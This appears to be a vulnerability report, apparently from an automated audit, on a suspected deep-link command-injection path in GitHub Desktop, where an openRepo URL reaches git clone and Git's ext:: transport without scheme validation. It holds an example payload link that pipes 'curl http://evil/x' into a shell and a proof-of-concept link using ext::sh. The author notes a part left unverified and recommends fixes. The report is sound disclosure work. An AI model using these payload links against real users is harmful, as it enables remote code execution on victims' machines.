## Summary

The Snap report's core flaw was "any untrusted caller can drive a privileged operation without validation of what it is being asked to do." The closest verified analog in GitHub Desktop is that the `x-github-client://openRepo/...` protocol handler (and `github-mac://`/`github-windows://` legacy handlers) accepts an **arbitrary, unvalidated remote URL string** from a link a user merely clicks, and that string is fed, without any scheme allow-listing, straight into `git clone` execution — enabling Git's `ext::`/`fd::` remote-helper transports to run arbitrary shell commands.

## Finding Description

`parseAppURL` extracts the `openRepo` path component as the repository `url` with essentially no validation beyond checking it isn't empty — it only validates `branch`/`pr` query parameters, never the `url` itself: [1](#0-0) 

That raw string flows into `Dispatcher.openRepositoryFromUrl` → `openOrCloneRepository`, which opens the "Clone repository" dialog pre-filled with the attacker-controlled URL: [2](#0-1) 

When the user clicks "Clone" (the same single action a legitimate "Open in Desktop" flow expects), `resolveCloneInfo` only rewrites the URL if it matches a recognizable owner/repo GitHub identifier via `parseRemote`; any string that doesn't match those regexes (e.g., `ext::sh -c "curl evil/x|sh"`) is passed through completely unmodified as `{ url }`: [3](#0-2) [4](#0-3) 

This unmodified string reaches `git/clone.ts`, which builds the `git clone` invocation and appends the URL to the argument list with no protocol allow-listing (no `GIT_ALLOW_PROTOCOL`, no scheme check) — only the destination *path* is checked via `isClonePathSensitive`, not the *url*: [5](#0-4) 

I searched the codebase for any `GIT_ALLOW_PROTOCOL` or protocol allow-list configuration and found none, confirming there is no guard preventing Git's `ext::`/`fd::` remote helpers (which execute arbitrary shell commands as part of establishing the "connection") from being invoked when `git clone <url>` runs.

## Impact Explanation

If exploitable as described, a malicious website or chat message need only get the victim to click a link like:
`x-github-client://openRepo/ext::sh%20-c%20%22curl%20http://evil/x|sh%22`

Desktop opens its own trusted "Clone repository" dialog pre-populated with this string (as it would for a normal GitHub URL), and the user's single confirming click ("Clone") causes Git to execute the attacker's shell command as the local user — arbitrary code execution outside of any git-content sandbox, entirely via a link click plus one expected, in-context confirmation click.

## Likelihood Explanation

I was not able to fully verify within the available tool budget whether the "Generic"/URL clone tab in `clone-repository.tsx` performs any client-side scheme validation before enabling the "Clone" button (my final lookup of `clone-generic-repository.tsx` did not complete). This is a real gap in my verification: if that component restricts input to `https://`/`ssh://`/`git@` looking strings via `checkIfCloningDisabled`/text-field validation, the practical likelihood is lower. Based on what I *did* confirm — `parseAppURL`, `resolveCloneInfo`, and `git/clone.ts` all pass the string through unfiltered — the underlying lack-of-allow-listing at the Git-invocation layer is confirmed, but whether the UI adds a scheme filter before that point is uncertain.

## Recommendation

- Validate/allow-list the URL scheme (`https:`, `ssh:`, `git:`) both when parsing deep-link `openRepo` actions in `parse-app-url.ts` and again immediately before invoking `git clone` in `app/src/lib/git/clone.ts`, rejecting `ext::`, `fd::`, `file://`, and other non-network transports.
- Set `GIT_ALLOW_PROTOCOL=http:https:ssh:git` (or equivalent) in the environment used for `clone`/`fetch`/`pull`/`push` operations in `app/src/lib/git/environment.ts` as defense in depth.
- Confirm (this needs direct verification, which I could not complete) whether `clone-generic-repository.tsx` already performs comparable scheme filtering; if so, the same filter needs to be applied to the deep-link-originated URL before it ever reaches the dialog, since deep links are a more strongly attacker-controlled input than manual typing.

## Proof of Concept

1. Attacker hosts a link: `<a href="x-github-client://openRepo/ext::sh -c 'touch /tmp/pwned'">Open in GitHub Desktop</a>`.
2. Victim (with Desktop installed and the protocol registered, per `app/src/main-process/main.ts` `possibleProtocols`) clicks the link.
3. `handleAppURL` → `parseAppURL` returns `{ name: 'open-repository-from-url', url: 'ext::sh -c \'touch /tmp/pwned\'' }` (no scheme validation) — confirmed by `parse-app-url.ts` logic.
4. Desktop opens the "Clone repository" dialog pre-filled with this string via `openOrCloneRepository`.
5. Victim clicks "Clone", triggering `dispatcher.clone(url, path, …)` → `git/clone.ts`'s `git([...,'--', url, path], …)`.
6. Git invokes the `ext::` transport, executing the attacker's shell command.

        return { url }

    const cloneInfo = await this.resolveCloneInfo()
    const { path } = this.getSelectedTabState()

    if (path == null) {

      this.setState({ loading: false })
      this.setSelectedTabState({ error })
      return
    }

    if (!cloneInfo) {
      const error = new Error(
        `We couldn't find that repository. Check that you are logged in, the network is accessible, and the URL or repository alias are spelled correctly.`
      )
      this.setState({ loading: false })
      this.setSelectedTabState({ error })
      return
    }

    const { url, defaultBranch } = cloneInfo

    this.props.dispatcher.closeFoldout(FoldoutType.Repository)
    try {
      this.cloneImpl(url.trim(), path, defaultBranch)
    } catch (e) {
      log.error(`CloneRepository: clone failed to complete to ${path}`, e)
      this.setState({ loading: false })
      this.setSelectedTabState({ error: e })
    }
  }

export async function clone(
  url: string,
  path: string,
  options: CloneOptions,
  progressCallback?: (progress: ICloneProgress) => void
): Promise<void> {
  if (isClonePathSensitive(path)) {
    throw new Error(
      `The clone destination "${path}" targets a sensitive system location. ` +
        'Cloning into this directory is not allowed.'
    )
  }

  const env = {
    ...(await envForRemoteOperation(url)),
    GIT_CLONE_PROTECTION_ACTIVE: 'false',
  }

  const defaultBranch = options.defaultBranch ?? (await getDefaultBranch())

  const args = [
    '-c',
    `init.defaultBranch=${defaultBranch}`,
    'clone',
    '--recursive',
  ]

  let opts: IGitStringExecutionOptions = { env }

  if (progressCallback) {
    args.push('--progress')

    const title = `Cloning into ${path}`
    const kind = 'clone'

    opts = await executionOptionsWithProgress(
      { ...opts, trackLFSProgress: true },
      new CloneProgressParser(),
      progress => {
        const description =
          progress.kind === 'progress' ? progress.details.text : progress.text
        const value = progress.percent

        progressCallback({ kind, title, description, value })
      }
    )

    // Initial progress
    progressCallback({ kind, title, value: 0 })
  }

  if (options.branch) {
    args.push('-b', options.branch)
  }

  args.push('--', url, path)

  await git(args, __dirname, 'clone', opts)
}
